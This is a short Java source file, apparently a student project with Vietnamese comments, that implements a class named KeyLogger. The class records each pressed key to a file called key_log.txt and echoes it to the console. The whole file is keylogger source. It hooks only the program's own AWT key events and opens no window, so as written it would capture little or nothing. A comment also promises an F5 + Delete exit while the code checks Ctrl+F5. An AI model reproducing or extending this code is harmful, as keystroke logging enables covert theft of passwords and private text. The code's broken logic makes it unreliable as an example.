/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylog;
import java.awt.KeyEventDispatcher;
import java.awt.event.*;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

public class KeyLogger implements KeyListener {
    private BufferedWriter writer;

    public KeyLogger() {
        try {
            // Mở tệp để ghi
            writer = new BufferedWriter(new FileWriter("key_log.txt"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void keyTyped(KeyEvent e) {
        // Không làm gì khi phím được gõ
    }

    @Override
    public void keyPressed(KeyEvent e) {
        try {
            // Ghi ký tự vào tệp
            writer.write(e.getKeyChar());
            writer.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        System.out.println(e.getKeyChar());
        // Kiểm tra tổ hợp phím F5 + Delete
        if (e.getKeyCode() == KeyEvent.VK_F5 && e.isControlDown()) {
            try {
                writer.close(); // Đóng luồng ghi
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            System.exit(0); // Kết thúc chương trình
        }
    }

    @Override
    public void keyReleased(KeyEvent e) {
        // Không làm gì khi phím được thả ra
    }

    public static void main(String[] args) {
        KeyLogger keyLogger = new KeyLogger();
        // Bắt đầu lắng nghe sự kiện phím trong một luồng riêng
        Thread thread = new Thread(() -> {
            // Bắt sự kiện phím
            java.awt.KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
                @Override
                public boolean dispatchKeyEvent(KeyEvent e) {
                    // Gửi sự kiện phím đến KeyLogger
                    keyLogger.dispatchEvent(e);
                    return false;
                }
            });
        });
        thread.start(); // Khởi động luồng
    }

    public void dispatchEvent(KeyEvent e) {
        switch (e.getID()) {
            case KeyEvent.KEY_PRESSED:
                this.keyPressed(e);
                break;
            case KeyEvent.KEY_RELEASED:
                this.keyReleased(e);
                break;
            case KeyEvent.KEY_TYPED:
                this.keyTyped(e);
                break;
            default:
                break;
        }
    }
}
